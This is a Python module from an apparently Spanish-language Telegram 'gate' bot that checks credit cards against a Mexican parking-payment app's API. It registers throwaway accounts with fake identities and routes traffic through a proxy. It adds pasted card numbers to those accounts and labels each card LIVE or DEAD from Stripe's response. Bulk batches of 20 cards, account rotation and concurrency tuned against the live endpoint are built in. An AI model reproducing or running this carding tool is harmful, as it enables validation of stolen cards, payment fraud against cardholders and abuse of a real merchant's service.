
import asyncio
import json
import os
import random
import string
import sys

if __name__ == "__main__":
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    for _stream in (sys.stdout, sys.stderr):
        try:
            _stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass

from primp import AsyncClient

import config
from gates.base import Gate, GateResult
from gates.helpers import parse_cc, mask_card
from gates.registry import register
from gates.user_context import current_owner

# ══════════════════════════════════════
# CONFIG
# ══════════════════════════════════════
BASE = "https://parkingpay-api-prod.azurewebsites.net"

# Tarjetas que dura una cuenta antes de rotar a una nueva
ACCOUNT_LIFETIME = 50

COMMON_HEADERS = {
    "user-agent": "Dart/2.18 (dart:io)",
    "content-type": "application/json; charset=utf-8",
    "accept-encoding": "gzip",
    "host": "parkingpay-api-prod.azurewebsites.net",
}

# Estado por usuario de Telegram: {"client", "token", "email", "used"}
_USER_STATE: dict = {}
# Lock de setup por usuario: las N tarjetas paralelas registran UNA sola cuenta
_USER_LOCKS: dict = {}


# ══════════════════════════════════════
# HELPERS
# ══════════════════════════════════════
def _get_lock(owner: str) -> asyncio.Lock:
    lock = _USER_LOCKS.get(owner)
    if lock is None:
        lock = _USER_LOCKS.setdefault(owner, asyncio.Lock())
    return lock


def _clear_state(owner: str) -> None:
    """Descarta la cuenta del usuario.

    primp.AsyncClient no tiene close(): se suelta la referencia y Rust lo
    destruye solo cuando terminan sus requests en vuelo (patrón de base.py).
    """
    _USER_STATE.pop(owner, None)


def _random_identity() -> dict:
    """Genera identidad random para registro."""
    try:
        import names
        first = names.get_first_name()
        last = names.get_last_name()
    except ImportError:
        first = "".join(random.choices(string.ascii_lowercase, k=6)).title()
        last = "".join(random.choices(string.ascii_lowercase, k=7)).title()

    return {
        "first_name": first,
        "last_name": last,
        "email": f"{first.lower()}{last.lower()}{random.randint(100000, 999999)}@gmail.com",
        "phone": str(random.randint(1000000000, 9999999999)),
        "password": f"{first.lower()}{last.lower()}{random.randint(1000, 9999)}.",
    }


def _gate_off(response) -> bool:
    return (
        response.status_code == 403
        or "web app is stopped" in response.text.lower()
        or "Web App - Unavailable" in response.text
    )


# ══════════════════════════════════════
# CUENTA PERSISTENTE (register + login, rota cada ACCOUNT_LIFETIME tarjetas)
# ══════════════════════════════════════
async def _ensure_account(owner: str) -> dict:
    """Devuelve la cuenta vigente del usuario, registrando una si hace falta.

    - La cuenta PERSISTE entre invocaciones (singles y bulks) hasta acumular
      ACCOUNT_LIFETIME (50) add_cards; recién ahí rota a una nueva.
    - Las tarjetas paralelas del bulk esperan en el lock y comparten la cuenta
      que la primera registró (ninguna registra la suya propia).
    - Lanza ValueError si el gate está off.
    """
    async with _get_lock(owner):
        st = _USER_STATE.get(owner)
        if st and st.get("token") and st.get("used", 0) < ACCOUNT_LIFETIME:
            return st

        # Rotación: cuenta agotada (>= ACCOUNT_LIFETIME) o inexistente. La
        # vieja muere sola (GC de Rust) al terminar sus requests en vuelo.
        _USER_STATE.pop(owner, None)

        proxy = (config.GLOBAL_PROXY or "").strip()
        proxy_url = proxy if proxy else None
        identity = _random_identity()
        client = AsyncClient(
            proxy=proxy_url,
            timeout=config.GLOBAL_TIMEOUT,
            verify=not bool(proxy),
        )

        try:
            # ── 1. POST /api/app/usuarios/registro ────────────
            response = await client.post(
                f"{BASE}/api/app/usuarios/registro",
                json={
                    "correoElectronico": identity["email"],
                    "nombre": identity["first_name"],
                    "apellidos": identity["last_name"],
                    "telefono": identity["phone"],
                    "contrasena": identity["password"],
                },
                headers=COMMON_HEADERS,
            )
            print(f"[1] POST /registro -> {response.status_code} | {identity['email']}")

            if _gate_off(response):
                raise ValueError("Gate off - activo en horario laboral MX")
            if response.status_code != 200:
                raise ValueError(f"Registro failed ({response.status_code}): {response.text[:100]}")

            # ── 2. POST /api/auth ─────────────────────────────
            response = await client.post(
                f"{BASE}/api/auth",
                json={
                    "correoElectronico": identity["email"],
                    "contrasena": identity["password"],
                },
                headers=COMMON_HEADERS,
            )
            print(f"[2] POST /auth -> {response.status_code}")

            if _gate_off(response):
                raise ValueError("Gate off - activo en horario laboral MX")
            if response.status_code != 200:
                raise ValueError(f"Login failed ({response.status_code}): {response.text[:100]}")

            try:
                auth_data = response.json()
            except Exception:
                auth_data = None
            if not auth_data or not auth_data.get("token"):
                raise ValueError("Login OK pero sin token en respuesta")

            token = auth_data["token"]
            print(f"    -> Cuenta lista para {owner} | token: {token[:30]}...")

            _USER_STATE[owner] = {
                "client": client,
                "token": token,
                "email": identity["email"],
                "used": 0,
            }
            return _USER_STATE[owner]
        except ValueError:
            raise
        except Exception as e:
            raise ValueError(f"Setup cuenta: {type(e).__name__}: {str(e)[:100]}")


# ══════════════════════════════════════
# ADD CARD (1 request por tarjeta, sobre la cuenta compartida)
# ══════════════════════════════════════
async def _add_card(st: dict, card: dict) -> dict:
    """POST /api/app/conductor/tarjetas sobre la cuenta compartida."""
    card_headers = COMMON_HEADERS.copy()
    card_headers["authorization"] = st["token"]

    exp_year = card["exp_year"]
    if len(exp_year) == 2:
        exp_year = f"20{exp_year}"

    try:
        response = await st["client"].post(
            f"{BASE}/api/app/conductor/tarjetas",
            json={
                "numero": card["number"],
                "expiracionMes": card["exp_month"].zfill(2),
                "expiracionYear": exp_year,
            },
            headers=card_headers,
        )
    except Exception as e:
        # Error de red (timeout/conexion): la cuenta SIGUE valida — no rotarla
        return {"status": "ERROR", "message": f"Red: {type(e).__name__}: {str(e)[:80]}"}

    print(f"[3] POST /tarjetas -> {response.status_code}")
    body = response.text

    if _gate_off(response):
        return {"status": "ERROR", "message": "Gate off - activo en horario laboral MX"}

    # Token vencido / invalido -> refrescar cuenta y reintentar
    if response.status_code == 401 or "no autorizado" in body.lower():
        return {"status": "ERROR", "message": "Token de la cuenta expirado"}

    # Endpoint saturado (rate limit / 5xx vacio) -> reintentar SIN rotar cuenta
    if response.status_code in (429, 503) or (response.status_code == 500 and not body.strip()):
        return {"status": "ERROR", "message": "Endpoint saturado"}

    # Clasificar respuesta
    if "fingerprint" in body:
        return {"status": "LIVE", "message": "Charge $1 MXN Approved"}
    if "error al crear la tarjeta en stripe" in body.lower():
        # Intentar extraer mensaje de Stripe
        try:
            j = response.json()
        except Exception:
            j = None
        stripe_msg = ""
        if j and isinstance(j, dict):
            stripe_msg = j.get("message", "") or j.get("error", "") or ""
        msg = stripe_msg[:120] if stripe_msg else "Declined by Stripe"
        return {"status": "DEAD", "message": msg}

    # Fallback
    try:
        j = response.json()
    except Exception:
        j = None
    if j and isinstance(j, dict):
        msg = j.get("message", "") or j.get("error", "") or str(j)[:120]
        return {"status": "DEAD", "message": msg}

    return {"status": "DEAD", "message": f"Unknown: {body[:120]}"}


# ══════════════════════════════════════
# GATE PARA TELEGRAM
# ══════════════════════════════════════
@register
class GateParkingPay(Gate):
    name = "parkingpay"
    description = "CCN CHARGED"
    cost = 1
    category = "CCN CHARGED"
    # Tope calibrado en vivo: el endpoint aguanta ~10-15 add_card simultáneas
    # (a 40 concurrentes, 70% de las tarjetas terminó en timeout). Con batches
    # de 10 por usuario, 30 mantiene a 3 usuarios a velocidad completa y al
    # resto en cola FIFO local SIN timeouts; sin tope, la cola del endpoint
    # convierte el excedente en results "error" (peor que esperar 2s).
    concurrency = 30
    input_hint = "tarjeta|mes|ano|cvv"
    # Bulk obligatorio de 20 en 20 para no-admins (exact_bulk manda antes
    # que max_bulk, ambos deben coincidir si no nadie fuera admin pasa).
    exact_bulk = 20
    max_bulk = 20
    help_extra = (
        "\n📦 <b>Bulk testing</b> — obligatorio de <b>20 en 20</b>\n"
        "Envía <b>exactamente 20 tarjetas</b> (una por línea, sin sobrar ni faltar):\n"
        "<code>.sa 4111111111111111|12|28|123</code>\n"
        "…19 líneas más (20 en total). Los admins pueden enviar cualquier cantidad."
    )
    _STATUS_MAP = {"LIVE": "success", "DEAD": "declined", "ERROR": "error"}

    async def test(self, input_data: str) -> GateResult:
        try:
            card = parse_cc(input_data)
        except ValueError as e:
            return GateResult(status="error", message=str(e))

        owner = current_owner()
        masked = mask_card(card["number"])
        # Errores de red/saturación tienen +2 intentos: el Azure del endpoint
        # es inestable por momentos y un timeout suele recuperarse al reintentar.
        hard_budget = max(1, config.GLOBAL_RETRIES)
        net_budget = hard_budget + 2
        hard = 0
        net = 0
        last_msg = "Unknown error"

        while hard < hard_budget and net < net_budget:
            # Cuenta persistente del usuario (register + login cada 50 tarjetas)
            try:
                st = await _ensure_account(owner)
            except ValueError as e:
                last_msg = str(e)
                if last_msg.startswith("Gate off"):
                    return GateResult(status="error", message=last_msg, data={"card": masked})
                is_net = "TimeoutError" in last_msg or "RequestError" in last_msg
                if is_net:
                    net += 1
                    print(f"    [RETRY red {net}/{net_budget}] {last_msg[:80]}")
                else:
                    hard += 1
                    print(f"    [RETRY {hard}/{hard_budget}] {last_msg[:80]}")
                continue

            result = await _add_card(st, card)
            if result["status"] != "ERROR":
                # Consumió un slot de vida de la cuenta
                st["used"] = st.get("used", 0) + 1
                return GateResult(
                    status=self._STATUS_MAP.get(result["status"], "error"),
                    message=result.get("message", ""),
                    data={"card": masked},
                )

            last_msg = result.get("message", last_msg)

            if last_msg.startswith("Gate off"):
                return GateResult(status="error", message=last_msg, data={"card": masked})

            if last_msg.startswith("Endpoint saturado") or last_msg.startswith("Red:"):
                # La cuenta sigue válida (red lenta / endpoint saturado):
                # esperar (con jitter anti-avalancha) y reintentar SIN rotar
                net += 1
                print(f"    [RETRY red {net}/{net_budget}] {last_msg[:80]}")
                continue

            # Token vencido / sesión muerta -> cuenta nueva
            hard += 1
            print(f"    [RETRY {hard}/{hard_budget}] {last_msg[:80]}")
            _clear_state(owner)

        return GateResult(status="error", message=last_msg, data={"card": masked})

    async def close(self) -> None:
        for owner in list(_USER_STATE.keys()):
            _clear_state(owner)
        await super().close()


if __name__ == "__main__":
    if len(sys.argv) > 1:
        gate = GateParkingPay()
        result = asyncio.run(gate.test(sys.argv[1]))
        print(json.dumps(
            {"status": result.status, "message": result.message, "data": result.data},
            ensure_ascii=False, indent=2,
        ))
    else:
        print("Uso: python gates/gate_stripe_park.py tarjeta|mes|ano|cvv")